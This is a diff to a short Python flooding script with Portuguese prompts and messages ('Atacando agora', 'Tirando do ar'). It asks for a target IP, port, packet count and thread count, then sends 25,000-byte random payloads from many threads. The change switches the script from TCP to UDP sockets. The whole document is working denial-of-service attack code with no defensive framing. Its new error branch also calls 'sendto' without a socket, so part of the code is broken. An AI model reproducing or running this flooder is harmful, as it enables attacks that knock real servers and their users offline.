@@ -12,35 +12,25 @@ packs = int(input("[♤] Quant. Pacotes: "))
 thread = int(input("[♤] Velocidade do Envio: "))
 
 def start():
-    hh = random._urandom(25000)
-    xx = int(0)
+    bytes = random._urandom(25000)
+    envios = int(0)
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect((ip,port))
             for i in range(packs):
-                s.sendto(hh, (ip, port))
-                xx += 1
-                print('Atacando agora '+ip+' || Enviando: '+str(xx))
+                s.sendto(bytes, (ip, port))
+                envios += 1
+                print('Atacando agora: '+ip+' || Enviando: '+str(envios))
         except:
              s.close()
-             print("Feito!")
+             print("\nTirando do ar...\n")
+             if not packs:
+                 sendto(bytes, (ip, port))
+                 print('Atacando agora: '+ip+' || Enviando: '+str(envios))
+             else:
+                 print("\nFim do ataque.\n")
+                 break
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
